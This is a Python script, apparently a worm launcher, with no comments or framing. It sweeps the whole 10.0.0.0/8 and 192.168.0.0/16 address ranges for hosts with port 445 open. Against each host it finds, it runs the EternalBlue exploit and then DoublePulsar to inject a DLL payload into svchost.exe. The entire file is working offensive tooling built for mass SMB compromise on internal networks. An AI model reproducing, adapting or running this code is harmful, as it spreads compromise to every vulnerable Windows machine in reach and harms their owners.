import base64
import socket
import threading
import ipaddress
import time
from struct import pack
import sys
import os    
import subprocess
import ctypes

TIMEOUT = 0.05
PORT_TO_CHECK = 445
MAX_THREADS = 500

SUBNETS = [
    ipaddress.ip_network('192.168.0.0/16'),
    ipaddress.ip_network('10.0.0.0/8')
]

live_hosts = []
    

def get_ip():
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect(('8.8.8.8', 80))
    ipaddr = s.getsockname()[0]
    s.close()
    return(ipaddr)

def explt(target,tm):
    if get_ip() == target:
        pass
    else:
        ctypes.windll.kernel32.SetConsoleTitleW("Hidden")
        print(f"attacking target: {target} at {tm}")
        try:
            os.chdir("depens")
        except:
            pass
        os.system(f"Eternalblue-2.2.0.exe --TargetIp {target} --Target WIN72K8R2 --DaveProxyPort=0 --NetworkTimeout 60 --TargetPort 445 --VerifyTarget True --VerifyBackdoor True --MaxExploitAttempts 3 --GroomAllocations 12 --OutConfig 1.txt")
        os.system(f"Doublepulsar-1.3.1.exe --OutConfig 2.txt --TargetIp {target} --TargetPort 445 --DllPayload p.dll --DllOrdinal 1 --ProcessName svchost.exe --ProcessCommandLine --Protocol SMB --Architecture x86 --Function Rundll")

def check_host(ip):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as sock:
            sock.settimeout(TIMEOUT)
            result = sock.connect_ex((str(ip), PORT_TO_CHECK))
            if result == 0:
                live_hosts.append(str(ip))
                a = (ip,time.time())
                thrd = threading.Thread(target=explt,args=a)
                thrd.start()
                print(f"{ip} is live")
    except Exception as e:
        pass

def scan_subnet(subnet):
    print("scanning subnet")
    for ip in subnet.hosts():
        thread = threading.Thread(target=check_host, args=(ip,))
        thread.start()
        if threading.active_count() > MAX_THREADS:
            thread.join()

def main():
    for subnet in SUBNETS:
        scan_subnet(subnet)
    
    while threading.active_count() > 1:
        time.sleep(0.1)

    print(f"Live hosts discovered: {len(live_hosts)}")
    for host in live_hosts:
        print(host)
    
    print("Scan completed")

main()
